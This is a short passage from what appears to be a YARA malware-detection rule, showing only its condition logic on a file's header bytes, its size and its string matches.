   condition:
      ( uint16(0) == 0x6463 and filesize < 1KB and ( all of them )
      ) or ( all of them )
}
